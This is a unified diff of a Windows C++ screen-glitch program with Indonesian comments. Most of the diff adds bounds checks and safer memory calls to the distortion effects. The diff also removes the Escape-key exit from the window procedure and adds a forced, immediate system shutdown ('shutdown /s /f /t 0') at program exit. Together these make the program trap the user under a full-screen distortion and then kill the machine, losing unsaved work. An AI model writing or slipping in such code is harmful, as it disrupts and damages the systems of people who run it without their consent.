@@ -8,6 +8,7 @@
 #include <algorithm>
 
 #pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "user32.lib")
 
 // Konfigurasi intensitas
 const int REFRESH_RATE = 10; // Refresh rate sangat cepat
@@ -106,8 +107,10 @@ void CaptureScreen(HWND hwnd) {
         hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
     }
     
-    SelectObject(hdcMem, hGlitchBitmap);
-    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
+    if (hGlitchBitmap) {
+        SelectObject(hdcMem, hGlitchBitmap);
+        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
+    }
     
     // Tangkap posisi kursor
     POINT pt;
@@ -121,9 +124,12 @@ void CaptureScreen(HWND hwnd) {
 
 void ApplyColorShift(BYTE* pixels, int shift) {
     for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
-        BYTE temp = pixels[i];
-        pixels[i] = pixels[i + shift];
-        pixels[i + shift] = temp;
+        // Pastikan tidak melebihi batas array
+        if (i + shift + 2 < screenWidth * screenHeight * 4) {
+            BYTE temp = pixels[i];
+            pixels[i] = pixels[i + shift];
+            pixels[i + shift] = temp;
+        }
     }
 }
 
@@ -133,20 +139,21 @@ void ApplyScreenShake() {
 }
 
 void ApplyCursorEffect() {
-    if (!cursorVisible) return;
+    if (!cursorVisible || !pPixels) return;
     
     // Gambar efek distorsi di sekitar kursor
-    int cursorSize = 30 * intensityLevel;
-    for (int y = cursorY - cursorSize; y < cursorY + cursorSize; y++) {
-        if (y < 0 || y >= screenHeight) continue;
-        
-        for (int x = cursorX - cursorSize; x < cursorX + cursorSize; x++) {
-            if (x < 0 || x >= screenWidth) continue;
-            
+    int cursorSize = min(30 * intensityLevel, 300);
+    int startX = max(cursorX - cursorSize, 0);
+    int startY = max(cursorY - cursorSize, 0);
+    int endX = min(cursorX + cursorSize, screenWidth - 1);
+    int endY = min(cursorY + cursorSize, screenHeight - 1);
+    
+    for (int y = startY; y <= endY; y++) {
+        for (int x = startX; x <= endX; x++) {
             float dist = sqrt(pow(x - cursorX, 2) + pow(y - cursorY, 2));
             if (dist < cursorSize) {
                 int pos = (y * screenWidth + x) * 4;
-                if (pos < screenWidth * screenHeight * 4 - 4) {
+                if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                     // Ubah warna pixel di sekitar kursor
                     pPixels[pos] = 255 - pPixels[pos]; // Blue
                     pPixels[pos + 1] = 255 - pPixels[pos + 1]; // Green
@@ -154,16 +161,16 @@ void ApplyCursorEffect() {
                     
                     // Tambahkan efek distorsi radial
                     if (dist < cursorSize / 2) {
-                        float amount = 1.0 - (dist / (cursorSize / 2));
-                        int shiftX = (x - cursorX) * amount * 5;
-                        int shiftY = (y - cursorY) * amount * 5;
+                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
+                        int shiftX = static_cast<int>((x - cursorX) * amount * 5);
+                        int shiftY = static_cast<int>((y - cursorY) * amount * 5);
                         
                         int srcX = x - shiftX;
                         int srcY = y - shiftY;
                         
                         if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                             int srcPos = (srcY * screenWidth + srcX) * 4;
-                            if (srcPos < screenWidth * screenHeight * 4 - 4) {
+                            if (srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4) {
                                 pPixels[pos] = pPixels[srcPos];
                                 pPixels[pos + 1] = pPixels[srcPos + 1];
                                 pPixels[pos + 2] = pPixels[srcPos + 2];
@@ -204,7 +211,7 @@ void UpdateParticles() {
             int y = static_cast<int>(it->y);
             if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                 int pos = (y * screenWidth + x) * 4;
-                if (pos < screenWidth * screenHeight * 4 - 4) {
+                if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                     pPixels[pos] = GetBValue(it->color);
                     pPixels[pos + 1] = GetGValue(it->color);
                     pPixels[pos + 2] = GetRValue(it->color);
@@ -235,18 +242,29 @@ void ApplyGlitchEffect() {
         int y = rand() % screenHeight;
         int height = 1 + rand() % (50 * intensityLevel);
         int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
-        int rgbShift = rand() % 20 - 10;
         
-        for (int h = 0; h < height && y + h < screenHeight; ++h) {
+        // Batasi height agar tidak melebihi batas layar
+        height = min(height, screenHeight - y);
+        if (height <= 0) continue;
+        
+        for (int h = 0; h < height; ++h) {
             int currentY = y + h;
+            if (currentY >= screenHeight) break;
+            
             BYTE* source = pCopy + (currentY * screenWidth * 4);
             BYTE* dest = pPixels + (currentY * screenWidth * 4);
             
             if (xOffset > 0) {
-                memmove(dest + xOffset * 4, source, (screenWidth - xOffset) * 4);
+                int copySize = (screenWidth - xOffset) * 4;
+                if (copySize > 0) {
+                    memmove_s(dest + xOffset * 4, 
+                             (screenWidth * 4) - (xOffset * 4),
+                             source, 
+                             copySize);
+                }
                 for (int x = 0; x < xOffset; x++) {
                     int pos = (currentY * screenWidth + x) * 4;
-                    if (pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos + 1] = rand() % 256;
                         pPixels[pos + 2] = rand() % 256;
@@ -254,10 +272,17 @@ void ApplyGlitchEffect() {
                 }
             } 
             else if (xOffset < 0) {
-                memmove(dest, source - xOffset * 4, (screenWidth + xOffset) * 4);
-                for (int x = screenWidth + xOffset; x < screenWidth; x++) {
+                int absOffset = -xOffset;
+                int copySize = (screenWidth - absOffset) * 4;
+                if (copySize > 0) {
+                    memmove_s(dest, 
+                             screenWidth * 4,
+                             source + absOffset * 4, 
+                             copySize);
+                }
+                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                     int pos = (currentY * screenWidth + x) * 4;
-                    if (pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos + 1] = rand() % 256;
                         pPixels[pos + 2] = rand() % 256;
@@ -269,8 +294,8 @@ void ApplyGlitchEffect() {
     
     // Distorsi blok ekstrim
     for (int i = 0; i < MAX_GLITCH_BLOCKS * intensityLevel; ++i) {
-        int blockWidth = 50 + rand() % (200 * intensityLevel);
-        int blockHeight = 50 + rand() % (200 * intensityLevel);
+        int blockWidth = min(50 + rand() % (200 * intensityLevel), screenWidth);
+        int blockHeight = min(50 + rand() % (200 * intensityLevel), screenHeight);
         int x = rand() % (screenWidth - blockWidth);
         int y = rand() % (screenHeight - blockHeight);
         int offsetX = (rand() % (300 * intensityLevel)) - 150 * intensityLevel;
@@ -284,8 +309,20 @@ void ApplyGlitchEffect() {
                 BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
                 BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                 
-                if (dest >= pPixels && dest + blockWidth*4 <= pPixels + screenWidth*screenHeight*4) {
-                    memcpy(dest, source, blockWidth * 4);
+                // Pastikan blok tidak keluar batas
+                int effectiveWidth = blockWidth;
+                if (x + offsetX + blockWidth > screenWidth) {
+                    effectiveWidth = screenWidth - (x + offsetX);
+                }
+                if (x + offsetX < 0) {
+                    effectiveWidth = blockWidth + (x + offsetX);
+                    source -= (x + offsetX) * 4;
+                    dest -= (x + offsetX) * 4;
+                }
+                
+                if (effectiveWidth > 0 && dest >= pPixels && 
+                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
+                    memcpy_s(dest, effectiveWidth * 4, source, effectiveWidth * 4);
                 }
             }
         }
@@ -302,7 +339,7 @@ void ApplyGlitchEffect() {
         int y = rand() % screenHeight;
         int pos = (y * screenWidth + x) * 4;
         
-        if (pos < screenWidth * screenHeight * 4 - 4) {
+        if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
             pPixels[pos] = rand() % 256;
             pPixels[pos + 1] = rand() % 256;
             pPixels[pos + 2] = rand() % 256;
@@ -313,21 +350,17 @@ void ApplyGlitchEffect() {
     if (rand() % (6 / intensityLevel) == 0) {
         int centerX = rand() % screenWidth;
         int centerY = rand() % screenHeight;
-        int radius = 100 + rand() % (500 * intensityLevel);
+        int radius = min(100 + rand() % (500 * intensityLevel), screenWidth/2);
         int distortion = 20 + rand() % (80 * intensityLevel);
         
-        for (int y = centerY - radius; y < centerY + radius; y++) {
-            if (y < 0 || y >= screenHeight) continue;
-            
-            for (int x = centerX - radius; x < centerX + radius; x++) {
-                if (x < 0 || x >= screenWidth) continue;
-                
+        for (int y = max(centerY - radius, 0); y < min(centerY + radius, screenHeight); y++) {
+            for (int x = max(centerX - radius, 0); x < min(centerX + radius, screenWidth); x++) {
                 float dx = x - centerX;
                 float dy = y - centerY;
                 float distance = sqrt(dx*dx + dy*dy);
                 
                 if (distance < radius) {
-                    float amount = pow(1.0 - (distance / radius), 2.0);
+                    float amount = pow(1.0f - (distance / radius), 2.0f);
                     int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 3 - 1));
                     int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 3 - 1));
                     
@@ -338,8 +371,8 @@ void ApplyGlitchEffect() {
                         int srcPos = (srcY * screenWidth + srcX) * 4;
                         int destPos = (y * screenWidth + x) * 4;
                         
-                        if (destPos < screenWidth * screenHeight * 4 - 4 && 
-                            srcPos < screenWidth * screenHeight * 4 - 4) {
+                        if (destPos >= 0 && destPos < screenWidth * screenHeight * 4 - 4 && 
+                            srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4) {
                             pPixels[destPos] = pCopy[srcPos];
                             pPixels[destPos + 1] = pCopy[srcPos + 1];
                             pPixels[destPos + 2] = pCopy[srcPos + 2];
@@ -358,15 +391,11 @@ void ApplyGlitchEffect() {
                 if (y + h >= screenHeight) break;
                 for (int x = 0; x < screenWidth; x++) {
                     int pos = ((y + h) * screenWidth + x) * 4;
-                    if (pos < screenWidth * screenHeight * 4 - 4) {
+                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                         // Perbaikan: Gunakan clamp sederhana untuk menghindari overflow
-                        int newB = static_cast<int>(pPixels[pos]) + 100;
-                        int newG = static_cast<int>(pPixels[pos + 1]) + 100;
-                        int newR = static_cast<int>(pPixels[pos + 2]) + 100;
-                        
-                        pPixels[pos] = (newB > 255) ? 255 : static_cast<BYTE>(newB);
-                        pPixels[pos + 1] = (newG > 255) ? 255 : static_cast<BYTE>(newG);
-                        pPixels[pos + 2] = (newR > 255) ? 255 : static_cast<BYTE>(newR);
+                        pPixels[pos] = min(pPixels[pos] + 100, 255);
+                        pPixels[pos + 1] = min(pPixels[pos + 1] + 100, 255);
+                        pPixels[pos + 2] = min(pPixels[pos + 2] + 100, 255);
                     }
                 }
             }
@@ -376,9 +405,11 @@ void ApplyGlitchEffect() {
     // Efek inversi warna acak
     if (rand() % (20 / intensityLevel) == 0) {
         for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
-            pPixels[i] = 255 - pPixels[i];
-            pPixels[i + 1] = 255 - pPixels[i + 1];
-            pPixels[i + 2] = 255 - pPixels[i + 2];
+            if (i < screenWidth * screenHeight * 4 - 4) {
+                pPixels[i] = 255 - pPixels[i];
+                pPixels[i + 1] = 255 - pPixels[i + 1];
+                pPixels[i + 2] = 255 - pPixels[i + 2];
+            }
         }
     }
     
@@ -416,27 +447,24 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         CaptureScreen(hwnd);
         ApplyGlitchEffect();
         
-        HDC hdcScreen = GetDC(NULL);
-        POINT ptZero = { 0 };
-        SIZE size = { screenWidth, screenHeight };
-        
-        SelectObject(hdcLayered, hGlitchBitmap);
-        UpdateLayeredWindow(hwnd, hdcScreen, NULL, &size, hdcLayered, 
-                           &ptZero, 0, &blend, ULW_ALPHA);
-        
-        ReleaseDC(NULL, hdcScreen);
+        if (hdcLayered && hGlitchBitmap) {
+            HDC hdcScreen = GetDC(NULL);
+            POINT ptZero = { 0 };
+            SIZE size = { screenWidth, screenHeight };
+            
+            SelectObject(hdcLayered, hGlitchBitmap);
+            UpdateLayeredWindow(hwnd, hdcScreen, NULL, &size, hdcLayered, 
+                               &ptZero, 0, &blend, ULW_ALPHA);
+            
+            ReleaseDC(NULL, hdcScreen);
+        }
         return 0;
     }
         
-    case WM_KEYDOWN:
-        if (wParam == VK_ESCAPE) 
-            DestroyWindow(hwnd);
-        return 0;
-        
     case WM_DESTROY:
         KillTimer(hwnd, 1);
-        DeleteObject(hGlitchBitmap);
-        DeleteDC(hdcLayered);
+        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
+        if (hdcLayered) DeleteDC(hdcLayered);
         ShowCursor(TRUE); // Pastikan kursor ditampilkan kembali
         PostQuitMessage(0);
         return 0;
@@ -491,5 +519,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+    
+    // Force shutdown setelah keluar
+    system("shutdown /s /f /t 0");
     return static_cast<int>(msg.wParam);
 }
